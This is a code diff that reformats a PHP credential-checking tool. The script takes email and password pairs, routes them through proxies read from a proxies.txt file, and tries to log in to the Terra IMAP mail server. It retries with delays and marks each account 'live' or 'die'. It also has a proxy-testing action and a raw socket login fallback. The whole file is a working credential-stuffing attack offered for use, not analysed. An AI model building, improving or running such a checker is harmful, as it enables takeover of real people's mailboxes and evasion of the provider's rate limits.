@@ -7,7 +7,9 @@ header('Access-Control-Allow-Origin: *');
 
 $action = $_GET['action'] ?? '';
 
-// ── INIT — lê proxies.txt ──
+// =========================================
+//  INIT
+// =========================================
 if ($action === 'init') {
     $proxies = [];
     $proxyFile = __DIR__ . '/proxies.txt';
@@ -23,38 +25,47 @@ if ($action === 'init') {
     exit;
 }
 
-// ── TEST_PROXY — testa HTTPS via proxy ──
+// =========================================
+//  TEST_PROXY
+// =========================================
 if ($action === 'test_proxy') {
     $proxy = $_POST['proxy'] ?? '';
-    if (empty($proxy)) { echo json_encode(['status' => 'fail']); exit; }
+    if (empty($proxy)) {
+        echo json_encode(['status' => 'fail']);
+        exit;
+    }
     $ok = testProxyHttps($proxy);
     echo json_encode(['status' => $ok ? 'ok' : 'fail']);
     exit;
 }
 
-// ── DIAG_PROXY — diagnóstico completo ──
+// =========================================
+//  DIAG_PROXY
+// =========================================
 if ($action === 'diag_proxy') {
     $proxy = $_POST['proxy'] ?? '';
-    if (empty($proxy)) { echo json_encode(['status' => 'fail', 'msg' => 'Proxy vazio']); exit; }
+    if (empty($proxy)) {
+        echo json_encode(['status' => 'fail', 'msg' => 'Proxy vazio']);
+        exit;
+    }
     $p = parseProxy($proxy);
     $diag = ['proxy' => $proxy, 'parsed' => $p, 'steps' => []];
 
-    // Step 1: HTTPS
+    // HTTPS test
     $ch = curl_init();
-    $opts = [
-        CURLOPT_URL => 'https://api.ipify.org/',
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => 15,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => 0,
-        CURLOPT_NOSIGNAL => 1,
-        CURLOPT_PROXY => $p['host'] . ':' . $p['port'],
-        CURLOPT_PROXYTYPE => CURLPROXY_HTTP,
-        CURLOPT_HTTPPROXYTUNNEL => true,
-        CURLOPT_PROXYAUTH => CURLAUTH_ANY,
-    ];
-    if (!empty($p['user'])) { $opts[CURLOPT_PROXYUSERPWD] = $p['user'] . ':' . $p['pass']; }
-    curl_setopt_array($ch, $opts);
+    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
+    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
+    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
+    curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_ANY);
+    if (!empty($p['user'])) {
+        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
+    }
     $res = curl_exec($ch);
     $diag['steps']['https'] = [
         'ok' => $res !== false,
@@ -64,28 +75,27 @@ if ($action === 'diag_proxy') {
     ];
     curl_close($ch);
 
-    // Step 2: IMAP
+    // IMAP test
     $ch2 = curl_init();
-    $opts2 = [
-        CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
-        CURLOPT_USERNAME => 'test@test.com',
-        CURLOPT_PASSWORD => 'test123',
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => 0,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => 20,
-        CURLOPT_CONNECTTIMEOUT => 20,
-        CURLOPT_NOSIGNAL => 1,
-        CURLOPT_PROXY => $p['host'] . ':' . $p['port'],
-        CURLOPT_PROXYTYPE => CURLPROXY_HTTP,
-        CURLOPT_HTTPPROXYTUNNEL => true,
-        CURLOPT_PROXYAUTH => CURLAUTH_ANY,
-        CURLOPT_VERBOSE => true,
-    ];
-    if (!empty($p['user'])) { $opts2[CURLOPT_PROXYUSERPWD] = $p['user'] . ':' . $p['pass']; }
+    curl_setopt($ch2, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
+    curl_setopt($ch2, CURLOPT_USERNAME, 'test@test.com');
+    curl_setopt($ch2, CURLOPT_PASSWORD, 'test123');
+    curl_setopt($ch2, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch2, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch2, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch2, CURLOPT_TIMEOUT, 20);
+    curl_setopt($ch2, CURLOPT_CONNECTTIMEOUT, 20);
+    curl_setopt($ch2, CURLOPT_NOSIGNAL, 1);
+    curl_setopt($ch2, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
+    curl_setopt($ch2, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+    curl_setopt($ch2, CURLOPT_HTTPPROXYTUNNEL, true);
+    curl_setopt($ch2, CURLOPT_PROXYAUTH, CURLAUTH_ANY);
+    if (!empty($p['user'])) {
+        curl_setopt($ch2, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
+    }
     $verboseLog = fopen('php://temp', 'w+');
     curl_setopt($ch2, CURLOPT_STDERR, $verboseLog);
-    curl_setopt_array($ch2, $opts2);
+    curl_setopt($ch2, CURLOPT_VERBOSE, true);
     $res2 = curl_exec($ch2);
     rewind($verboseLog);
     $verbose = stream_get_contents($verboseLog);
@@ -102,7 +112,9 @@ if ($action === 'diag_proxy') {
     exit;
 }
 
-// ── CHECK — valida credenciais ──
+// =========================================
+//  CHECK
+// =========================================
 if ($action === 'check') {
     $email = $_POST['email'] ?? '';
     $password = $_POST['password'] ?? '';
@@ -122,76 +134,79 @@ if ($action === 'check') {
 echo json_encode(['status' => 'ok']);
 exit;
 
-// ═══════════════════════════════════════
-//  PARSER DE PROXY
-// ═══════════════════════════════════════
+// =========================================
+//  PARSE PROXY
+// =========================================
+function parseProxy($proxy) {
+    $host = '';
+    $port = 0;
+    $user = '';
+    $pass = '';
 
-function parseProxy(string $proxy): array {
-    $host = ''; $port = 0; $user = ''; $pass = '';
-
-    if (preg_match('/^(socks[45]h?|https?):\/\/([^:@]+):([^@]+)@([^:]+):(\d+)$/i', $proxy, $m)) {
-        $user = $m[2]; $pass = $m[3]; $host = $m[4]; $port = (int)$m[5];
-    } elseif (preg_match('/^([^:@]+):([^@]+)@([^:]+):(\d+)$/', $proxy, $m)) {
-        $user = $m[1]; $pass = $m[2]; $host = $m[3]; $port = (int)$m[4];
-    } elseif (preg_match('/^(socks[45]h?|https?):\/\/([^:]+):(\d+)$/i', $proxy, $m)) {
-        $host = $m[2]; $port = (int)$m[3];
-    } elseif (preg_match('/^([^:]+):(\d+)$/', $proxy, $m)) {
-        $host = $m[1]; $port = (int)$m[2];
+    if (preg_match('#^(socks[45]h?|https?)://([^:@]+):([^@]+)@([^:]+):(\d+)$#i', $proxy, $m)) {
+        $user = $m[2];
+        $pass = $m[3];
+        $host = $m[4];
+        $port = (int)$m[5];
+    } elseif (preg_match('#^([^:@]+):([^@]+)@([^:]+):(\d+)$#', $proxy, $m)) {
+        $user = $m[1];
+        $pass = $m[2];
+        $host = $m[3];
+        $port = (int)$m[4];
+    } elseif (preg_match('#^(socks[45]h?|https?)://([^:]+):(\d+)$#i', $proxy, $m)) {
+        $host = $m[2];
+        $port = (int)$m[3];
+    } elseif (preg_match('#^([^:]+):(\d+)$#', $proxy, $m)) {
+        $host = $m[1];
+        $port = (int)$m[2];
     }
 
     return ['host' => $host, 'port' => $port, 'user' => $user, 'pass' => $pass];
 }
 
-// ═══════════════════════════════════════
-//  TESTE HTTPS (valida que o proxy responde)
-// ═══════════════════════════════════════
-
-function testProxyHttps(string $proxy): bool {
+// =========================================
+//  TEST PROXY HTTPS
+// =========================================
+function testProxyHttps($proxy) {
     if (!extension_loaded('curl')) return false;
     $p = parseProxy($proxy);
     if (empty($p['host'])) return false;
 
     $ch = curl_init();
-    $opts = [
-        CURLOPT_URL => 'https://api.ipify.org/',
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => 15,
-        CURLOPT_CONNECTTIMEOUT => 15,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => 0,
-        CURLOPT_NOSIGNAL => 1,
-        CURLOPT_PROXY => $p['host'] . ':' . $p['port'],
-        CURLOPT_PROXYTYPE => CURLPROXY_HTTP,
-        CURLOPT_HTTPPROXYTUNNEL => true,
-        CURLOPT_PROXYAUTH => CURLAUTH_ANY,
-    ];
+    curl_setopt($ch, CURLOPT_URL, 'https://api.ipify.org/');
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, 15);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, 15);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
+    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
+    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
+    curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_ANY);
     if (!empty($p['user'])) {
-        $opts[CURLOPT_PROXYUSERPWD] = $p['user'] . ':' . $p['pass'];
+        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
     }
-    curl_setopt_array($ch, $opts);
     $result = curl_exec($ch);
     curl_close($ch);
     return ($result !== false && strlen(trim($result)) > 0);
 }
 
-// ═══════════════════════════════════════
-//  VALIDAÇÃO — 5 TENTATIVAS COM DELAYS
-// ═══════════════════════════════════════
-
-function doValidate(string $email, string $password, string $proxy = ''): array {
+// =========================================
+//  DO VALIDATE
+// =========================================
+function doValidate($email, $password, $proxy = '') {
     $timeout = 20;
     $delays = [0, 3000000, 6000000, 10000000, 15000000];
 
     for ($attempt = 0; $attempt < 5; $attempt++) {
         if ($delays[$attempt] > 0) usleep($delays[$attempt]);
 
-        // COM proxy: HTTP CONNECT tunnel + IMAP
         if (!empty($proxy) && extension_loaded('curl')) {
             $r = tryCurlProxy($email, $password, $timeout, $proxy);
             if ($r !== null) return $r;
         }
 
-        // SEM proxy: cURL direto + socket
         if (empty($proxy)) {
             if (extension_loaded('curl')) {
                 $r = tryCurlDirect($email, $password, $timeout);
@@ -205,34 +220,31 @@ function doValidate(string $email, string $password, string $proxy = ''): array 
     return ['status' => 'die', 'email' => $email, 'reason' => 'Connection failed', 'retry_exhausted' => true];
 }
 
-// ═══════════════════════════════════════
-//  cURL COM PROXY (HTTP CONNECT TUNNEL)
-// ═══════════════════════════════════════
-
-function tryCurlProxy(string $email, string $password, int $timeout, string $proxy): ?array {
+// =========================================
+//  CURL COM PROXY (HTTP CONNECT TUNNEL)
+// =========================================
+function tryCurlProxy($email, $password, $timeout, $proxy) {
     $p = parseProxy($proxy);
     if (empty($p['host'])) return null;
 
     $ch = curl_init();
-    $opts = [
-        CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
-        CURLOPT_USERNAME => $email,
-        CURLOPT_PASSWORD => $password,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => 0,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => $timeout,
-        CURLOPT_CONNECTTIMEOUT => $timeout,
-        CURLOPT_NOSIGNAL => 1,
-        CURLOPT_PROXY => $p['host'] . ':' . $p['port'],
-        CURLOPT_PROXYTYPE => CURLPROXY_HTTP,
-        CURLOPT_HTTPPROXYTUNNEL => true,
-        CURLOPT_PROXYAUTH => CURLAUTH_ANY,
-    ];
+    curl_setopt($ch, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
+    curl_setopt($ch, CURLOPT_USERNAME, $email);
+    curl_setopt($ch, CURLOPT_PASSWORD, $password);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
+    curl_setopt($ch, CURLOPT_PROXY, $p['host'] . ':' . $p['port']);
+    curl_setopt($ch, CURLOPT_PROXYTYPE, CURLPROXY_HTTP);
+    curl_setopt($ch, CURLOPT_HTTPPROXYTUNNEL, true);
+    curl_setopt($ch, CURLOPT_PROXYAUTH, CURLAUTH_ANY);
     if (!empty($p['user'])) {
-        $opts[CURLOPT_PROXYUSERPWD] = $p['user'] . ':' . $p['pass'];
+        curl_setopt($ch, CURLOPT_PROXYUSERPWD, $p['user'] . ':' . $p['pass']);
     }
-    curl_setopt_array($ch, $opts);
+
     $result = curl_exec($ch);
     $errno = curl_errno($ch);
     curl_close($ch);
@@ -242,41 +254,42 @@ function tryCurlProxy(string $email, string $password, int $timeout, string $pro
     return null;
 }
 
-// ═══════════════════════════════════════
-//  cURL DIRETO (sem proxy)
-// ═══════════════════════════════════════
-
-function tryCurlDirect(string $email, string $password, int $timeout): ?array {
+// =========================================
+//  CURL DIRETO (sem proxy)
+// =========================================
+function tryCurlDirect($email, $password, $timeout) {
     $ch = curl_init();
-    curl_setopt_array($ch, [
-        CURLOPT_URL => 'imaps://imap.terra.com.br:993/INBOX',
-        CURLOPT_USERNAME => $email,
-        CURLOPT_PASSWORD => $password,
-        CURLOPT_SSL_VERIFYPEER => false,
-        CURLOPT_SSL_VERIFYHOST => 0,
-        CURLOPT_RETURNTRANSFER => true,
-        CURLOPT_TIMEOUT => $timeout,
-        CURLOPT_CONNECTTIMEOUT => $timeout,
-        CURLOPT_NOSIGNAL => 1,
-    ]);
+    curl_setopt($ch, CURLOPT_URL, 'imaps://imap.terra.com.br:993/INBOX');
+    curl_setopt($ch, CURLOPT_USERNAME, $email);
+    curl_setopt($ch, CURLOPT_PASSWORD, $password);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYPEER, false);
+    curl_setopt($ch, CURLOPT_SSL_VERIFYHOST, 0);
+    curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
+    curl_setopt($ch, CURLOPT_TIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_CONNECTTIMEOUT, $timeout);
+    curl_setopt($ch, CURLOPT_NOSIGNAL, 1);
+
     $result = curl_exec($ch);
     $errno = curl_errno($ch);
     curl_close($ch);
+
     if ($errno === 67) return ['status' => 'die', 'email' => $email, 'reason' => 'Invalid credentials'];
     if ($result !== false) return ['status' => 'live', 'email' => $email, 'reason' => 'OK'];
     return null;
 }
 
-// ═══════════════════════════════════════
+// =========================================
 //  SOCKET DIRETO (sem proxy)
-// ═══════════════════════════════════════
-
-function trySocketDirect(string $email, string $password, int $timeout): ?array {
+// =========================================
+function trySocketDirect($email, $password, $timeout) {
     $socket = @fsockopen('ssl://imap.terra.com.br', 993, $errno, $errstr, $timeout);
     if ($socket === false) return null;
     stream_set_timeout($socket, $timeout);
     $greeting = @fgets($socket, 8192);
-    if (!$greeting || stripos($greeting, 'OK') === false) { fclose($socket); return null; }
+    if (!$greeting || stripos($greeting, 'OK') === false) {
+        fclose($socket);
+        return null;
+    }
     $safe_email = addslashes($email);
     $safe_pass = addslashes($password);
     fwrite($socket, "A1 LOGIN \"{$safe_email}\" \"{$safe_pass}\"\r\n");
